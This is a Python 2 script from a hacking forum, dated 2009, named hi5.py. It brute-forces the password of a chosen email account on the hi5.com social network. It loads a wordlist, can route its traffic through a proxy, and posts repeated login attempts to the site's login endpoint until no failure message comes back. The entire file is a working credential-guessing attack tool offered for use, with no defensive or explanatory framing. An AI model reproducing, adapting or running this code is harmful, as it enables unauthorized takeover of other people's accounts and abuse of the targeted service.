#!/usr/bin/python 
# 
#                                                              # 
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
#                                                              # 
# 
#code: p47r1ck 
#name: hi5.py 
#version 1.0 
# 
#Special thanks to low1z! 
 
import urllib2, sys, re, urllib, httplib, socket 
 
print "\nH     H   H   HHHHHH   Brute Forcer!" 
print "H     H   H   H        Version 1.0" 
print "HHHHHHH   H   HHHH     Coded by P47r1ck!" 
print "H     H   H        H   www.darkc0de.com" 
print "H     H   H   HHHH'    06/2009" 
 
if len(sys.argv) not in [3,4,5,6]: 
	print "Usage: ./hi5.py <user> <wordlist> <options>\n" 
	print "\t   -p/-proxy <host:port> : Add proxy support" 
	print "\t   -v/-verbose : Verbose Mode\n" 
	sys.exit(1) 
 
for arg in sys.argv[1:]: 
	if arg.lower() == "-p" or arg.lower() == "-proxy": 
		proxy = sys.argv[int(sys.argv[1:].index(arg))+2] 
	if arg.lower() == "-v" or arg.lower() == "-verbose": 
		verbose = 1 
 
try: 
	if proxy: 
		print "\n[+] Testing Proxy..." 
		h2 = httplib.HTTPConnection(proxy) 
		h2.connect() 
		print "[+] Proxy:",proxy 
except(socket.timeout): 
	print "\n[-] Proxy Timed Out" 
	proxy = 0 
	pass 
except(NameError): 
	print "\n[-] Proxy Not Given" 
	proxy = 0 
	pass 
except: 
	print "\n[-] Proxy Failed" 
	proxy = 0 
	pass 
 
try: 
	if verbose == 1: 
		print "[+] Verbose Mode On\n" 
except(NameError): 
	print "[-] Verbose Mode Off\n" 
	verbose = 0 
	pass 
 
host = "http://hi5.com/friend/login.do" 
print "[+] BruteForcing:",host 
print "[+] Email:",sys.argv[1] 
 
try: 
  	words = open(sys.argv[2], "r").readlines() 
  	print "[+] Words Loaded:",len(words),"\n" 
except(IOError): 
  	print "[-] Error: Check your wordlist path\n" 
  	sys.exit(1) 
 
for word in words: 
	word = word.replace("\r","").replace("\n","") 
	login_form_seq = [ 
     	('email', sys.argv[1]), 
	('password', word), 
	('remember', 'on'), 
	('submit', 'Login')] 
	login_form_data = urllib.urlencode(login_form_seq) 
	if proxy != 0: 
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'}) 
		opener = urllib2.build_opener(proxy_handler) 
	else: 
		opener = urllib2.build_opener() 
	try: 
		opener.addheaders = [('User-agent', 'Mozilla/5.0')] 
		site = opener.open(host, login_form_data).read() 
	except(urllib2.URLError), msg: 
		print msg 
		site = "" 
		pass 
 
	if re.search("Your login and/or password were incorrect.",site) == None: 
		print "\n\t[!] Login Successfull:",sys.argv[1],word,"\n" 
		sys.exit(1) 
	else: 
		if verbose == 1: 
			print "[-] Login Failed:",word 
print "\n[-] Brute Complete\n" 

